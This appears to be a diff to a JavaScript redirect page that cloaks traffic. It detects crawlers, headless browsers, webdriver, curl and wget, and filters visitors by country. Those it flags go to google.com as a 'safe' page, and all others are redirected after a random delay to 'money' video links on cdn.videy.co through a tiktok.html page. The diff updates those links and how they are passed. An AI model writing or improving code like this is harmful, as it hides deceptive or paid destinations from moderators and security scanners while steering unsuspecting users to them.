@@ -20,7 +20,9 @@ const CONFIG = {
   offers: {
     a1: {
       money: [
-        "https://pid-watch-tv.github.io/8scghHD91.mp4"
+        "https://cdn.videy.co/BHtcImHS1.mp4",
+        "https://cdn.videy.co/pXNYp2ba1.mp4",
+        "https://cdn.videy.co/BHtcImHS1.mp4"
       ],
       safe: "https://google.com"
     }
@@ -36,7 +38,6 @@ const isBotUA = /bot|crawl|spider|headless|preview|wget|curl/i.test(ua);
 const isWebdriver = navigator.webdriver === true;
 
 const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
-const pick = arr => arr[Math.floor(Math.random() * arr.length)];
 
 async function getCountry() {
   try {
@@ -57,10 +58,10 @@ async function getCountry() {
   if (CONFIG.allowedCountries.length && !CONFIG.allowedCountries.includes(country))
     return location.href = CONFIG.offers[id].safe;
 
-  const video = pick(CONFIG.offers[id].money);
+  const videos = CONFIG.offers[id].money.join("|");
 
   setTimeout(() => {
-    location.replace("player.html?v=" + encodeURIComponent(video));
+    location.replace("tiktok.html?v=" + encodeURIComponent(videos));
   }, rand(CONFIG.delayMin, CONFIG.delayMax));
 })();
 </script>
